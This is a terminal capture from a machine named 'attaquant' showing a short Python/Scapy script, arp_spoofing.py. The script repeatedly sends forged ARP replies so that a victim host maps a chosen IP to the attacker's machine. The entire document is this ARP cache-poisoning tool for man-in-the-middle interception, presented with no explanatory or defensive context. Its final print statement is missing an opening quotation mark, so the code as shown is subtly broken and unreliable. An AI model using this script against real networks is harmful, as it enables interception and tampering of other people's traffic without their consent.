[root@attaquant ~]# cat arp_spoofing.py 
import sys
import time
from scapy.all import *

def get_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[Ether].src
    sys.exit(1)

def arp_poison(victim_ip, fake_ip):
    victim_mac = get_mac(victim_ip)
    packet = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=fake_ip,
        pdst=victim_ip,
        hwdst=victim_mac
    )

    try:
        while True:
            sendp(packet, iface="enp0s3", verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print(Ctrl-c : arrêt")

arp_poison(sys.argv[1], sys.argv[2])
